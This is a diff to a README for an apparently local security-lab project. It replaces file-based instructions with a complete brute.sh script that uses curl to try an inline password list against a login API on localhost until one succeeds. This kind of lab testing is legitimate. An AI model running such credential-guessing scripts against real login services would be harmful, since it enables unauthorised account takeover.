@@ -88,54 +88,39 @@ File: **`brute.sh`** (included). Run in **Git Bash** while the API is running:
 ./brute.sh
 ```
 
-By default it targets `USER="demo"` using a short internal wordlist.  
-You can switch the user or read from a file:
+### Run brute-force (inline wordlist)
 
-### Using a `wordlist.txt`
-
-**1) Create a simple wordlist**
 ```bash
-cat > wordlist.txt <<'EOF'
-123456
-123456789
-password
-qwerty
-abc123
-admin
-admin123
-contraseña
-contrasena
-hola123
-secret
-pass123
-EOF
+# brute.sh
 ```
+#!/usr/bin/env bash
+API="http://127.0.0.1:8000/login"
+USER="leo"   # cambia a 'demo' o 'admin' si quieres
 
-**2) (Optional) Adjust `brute.sh` to read the file**  
-Replace the loop with:
-```bash
+WORDLIST=(pass123 123456 admin admin123 demo secret qwerty password adios)
+
 attempts=0
 start=$(date +%s)
 
-while IFS= read -r pwd; do
+for pwd in "${WORDLIST[@]}"; do
   attempts=$((attempts+1))
   resp=$(curl -s -X POST "$API" \
     -H "accept: application/json" \
     -H "Content-Type: application/json" \
     -d "{\"username\":\"$USER\",\"password\":\"$pwd\"}")
-  echo "[$attempts] '$pwd' -> $resp"
+  echo "[$attempts] Probando '$pwd' -> $resp"
   if [[ "$resp" == *"login successful"* ]]; then
     end=$(date +%s)
-    echo "FOUND: '$pwd' in $attempts attempts, $((end-start))s"
+    echo "FOUND: password='$pwd' in $attempts attempts, $((end-start))s"
     exit 0
   fi
   sleep 0.2
-done < wordlist.txt
+done
 
 end=$(date +%s)
 echo "NOT found after $attempts attempts in $((end-start))s"
 exit 1
-```
+
 
 > Keep a small delay (e.g., `sleep 0.2`) so the test is **controlled** and you don’t overwhelm the local API.
 
